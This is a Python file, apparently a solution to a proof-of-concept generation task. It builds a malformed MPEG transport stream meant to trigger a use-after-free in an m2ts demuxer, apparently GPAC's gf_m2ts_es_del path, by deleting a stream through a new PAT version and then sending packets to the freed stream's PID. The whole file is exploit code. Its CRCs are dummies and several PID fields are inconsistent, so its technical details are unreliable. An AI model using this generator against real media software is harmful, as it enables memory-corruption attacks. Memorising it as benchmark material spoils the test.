import tarfile
import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to analyze the vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the relevant source files
            source_root = None
            for root, dirs, files in os.walk(tmpdir):
                if "m2ts.c" in files or "m2ts.h" in files:
                    source_root = root
                    break
            
            if not source_root:
                # If we can't find source, generate a minimal PoC
                return self._generate_minimal_poc()
            
            # Analyze the source to understand the vulnerability
            poc = self._analyze_and_generate_poc(source_root)
            if poc:
                return poc
            
            # Fallback to minimal PoC if analysis fails
            return self._generate_minimal_poc()
    
    def _analyze_and_generate_poc(self, source_root: str) -> bytes:
        """Analyze source code and generate targeted PoC"""
        try:
            # Look for m2ts source files
            m2ts_files = []
            for root, dirs, files in os.walk(source_root):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.h')) and 'm2ts' in file.lower():
                        m2ts_files.append(os.path.join(root, file))
            
            if not m2ts_files:
                return None
            
            # Read source files to understand structure
            for file_path in m2ts_files:
                try:
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        # Look for gf_m2ts_es_del function
                        if 'gf_m2ts_es_del' in content:
                            # Generate PoC based on common patterns
                            return self._generate_structured_poc()
                except:
                    continue
            
            return None
        except:
            return None
    
    def _generate_structured_poc(self) -> bytes:
        """Generate a structured PoC based on common M2TS patterns"""
        # Create a minimal M2TS-like structure that might trigger use-after-free
        # This is a generic approach since we can't analyze the exact vulnerability
        
        poc = bytearray()
        
        # M2TS header pattern (simplified)
        # Transport Stream packets are 188 bytes each
        
        # First packet: PAT (Program Association Table)
        pat = self._create_pat_packet()
        poc.extend(pat)
        
        # Second packet: PMT (Program Map Table) with ES
        pmt = self._create_pmt_packet()
        poc.extend(pmt)
        
        # Third packet: ES data to trigger allocation
        es_data = self._create_es_packet(pid=0x100, counter=0)
        poc.extend(es_data)
        
        # Fourth packet: Trigger deletion
        del_trigger = self._create_deletion_trigger()
        poc.extend(del_trigger)
        
        # Fifth packet: Use after free - reference freed ES
        uaf_trigger = self._create_uaf_trigger()
        poc.extend(uaf_trigger)
        
        # Pad to target length (1128 bytes = 6 packets of 188 bytes)
        while len(poc) < 1128:
            poc.extend(self._create_null_packet())
        
        return bytes(poc[:1128])
    
    def _generate_minimal_poc(self) -> bytes:
        """Generate minimal PoC when source analysis fails"""
        # Create a simple pattern that might trigger heap issues
        poc = bytearray()
        
        # Pattern: Repeated allocations and frees with overlapping references
        pattern = (
            # Trigger ES creation
            b'\x47' + b'\x00' * 187 +  # TS packet sync byte + data
            # Trigger deletion
            b'\x47' + b'\x01' * 187 +
            # Trigger use after free
            b'\x47' + b'\x02' * 187 +
            # More packets to reach target size
            b'\x47' * 188 * 3
        )
        
        poc.extend(pattern)
        
        # Ensure exact length
        return bytes(poc[:1128])
    
    def _create_pat_packet(self) -> bytes:
        """Create Program Association Table packet"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x40  # PID high (0x0000 for PAT)
        packet[2] = 0x00  # PID low
        packet[3] = 0x10  # Payload unit start, no adaptation
        
        # Simple PAT content
        packet[4] = 0x00  # Pointer field
        packet[5] = 0x00  # Table ID (PAT)
        packet[6] = 0xB0  # Section length high
        packet[7] = 0x0D  # Section length low
        packet[8] = 0x00  # TS ID high
        packet[9] = 0x01  # TS ID low
        packet[10] = 0xC1  # Version/current next
        packet[11] = 0x00  # Section number
        packet[12] = 0x00  # Last section number
        packet[13] = 0x00  # Program 0 (NIT)
        packet[14] = 0xE0
        packet[15] = 0x10
        packet[16] = 0x00  # Program 1
        packet[17] = 0x01
        packet[18] = 0xE0
        packet[19] = 0x20
        # CRC (dummy)
        packet[20] = 0x12
        packet[21] = 0x34
        packet[22] = 0x56
        packet[23] = 0x78
        
        return bytes(packet)
    
    def _create_pmt_packet(self) -> bytes:
        """Create Program Map Table packet"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x40  # PID high (0x0020 for PMT)
        packet[2] = 0x20  # PID low
        packet[3] = 0x10  # Payload unit start, no adaptation
        
        # Simple PMT content
        packet[4] = 0x00  # Pointer field
        packet[5] = 0x02  # Table ID (PMT)
        packet[6] = 0xB0  # Section length high
        packet[7] = 0x12  # Section length low
        packet[8] = 0x00  # Program number high
        packet[9] = 0x01  # Program number low
        packet[10] = 0xC1  # Version/current next
        packet[11] = 0x00  # Section number
        packet[12] = 0x00  # Last section number
        packet[13] = 0xE0  # PCR PID high
        packet[14] = 0x10  # PCR PID low
        packet[15] = 0xF0  # Program info length high
        packet[16] = 0x00  # Program info length low
        # ES info
        packet[17] = 0x1B  # H.264 video stream
        packet[18] = 0xE0  # ES PID high
        packet[19] = 0x01  # ES PID low (0x0100)
        packet[20] = 0xF0  # ES info length high
        packet[21] = 0x00  # ES info length low
        # CRC (dummy)
        packet[22] = 0x9A
        packet[23] = 0xBC
        packet[24] = 0xDE
        packet[25] = 0xF0
        
        return bytes(packet)
    
    def _create_es_packet(self, pid: int, counter: int) -> bytes:
        """Create Elementary Stream packet"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = (pid >> 8) & 0x1F | 0x40  # PID high
        packet[2] = pid & 0xFF  # PID low
        packet[3] = 0x10 | (counter & 0x0F)  # Counter
        
        # PES header
        packet[4] = 0x00
        packet[5] = 0x00
        packet[6] = 0x01
        packet[7] = 0xE0  # Video stream
        packet[8] = 0x00  # PES length high
        packet[9] = 0x00  # PES length low
        packet[10] = 0x80  # Flags
        
        # Some data that might trigger allocation
        packet[11] = 0x00
        packet[12] = 0x00
        packet[13] = 0x00
        packet[14] = 0x01  # NAL unit start
        packet[15] = 0x67  # SPS NAL unit
        
        return bytes(packet)
    
    def _create_deletion_trigger(self) -> bytes:
        """Create packet that might trigger ES deletion"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x40  # PAT PID high
        packet[2] = 0x00  # PAT PID low
        packet[3] = 0x11  # Counter 1
        
        # New PAT that removes the program
        packet[4] = 0x00  # Pointer field
        packet[5] = 0x00  # Table ID (PAT)
        packet[6] = 0xB0  # Section length high
        packet[7] = 0x08  # Section length low (shorter, no programs)
        packet[8] = 0x00  # TS ID high
        packet[9] = 0x01  # TS ID low
        packet[10] = 0xC2  # New version
        packet[11] = 0x00  # Section number
        packet[12] = 0x00  # Last section number
        # No programs listed
        packet[13] = 0x12  # CRC
        packet[14] = 0x34
        packet[15] = 0x56
        packet[16] = 0x78
        
        return bytes(packet)
    
    def _create_uaf_trigger(self) -> bytes:
        """Create packet that might trigger use-after-free"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0xE0  # ES PID high (0x0100 - same as allocated)
        packet[2] = 0x01  # ES PID low
        packet[3] = 0x11  # Counter 1, payload start
        
        # Reference to potentially freed ES
        # PES header
        packet[4] = 0x00
        packet[5] = 0x00
        packet[6] = 0x01
        packet[7] = 0xE0  # Video stream
        packet[8] = 0x00  # PES length
        packet[9] = 0x10
        packet[10] = 0x80  # Flags
        
        # Data that references ES context
        for i in range(11, 188):
            packet[i] = (i & 0xFF)  # Pattern that might trigger dereference
        
        return bytes(packet)
    
    def _create_null_packet(self) -> bytes:
        """Create null packet for padding"""
        packet = bytearray(188)
        packet[0] = 0x47  # Sync byte
        packet[1] = 0x1F  # Null packet PID high
        packet[2] = 0xFF  # Null packet PID low
        packet[3] = 0x10  # No adaptation
        
        # Fill with pattern
        for i in range(4, 188):
            packet[i] = 0xFF
        
        return bytes(packet)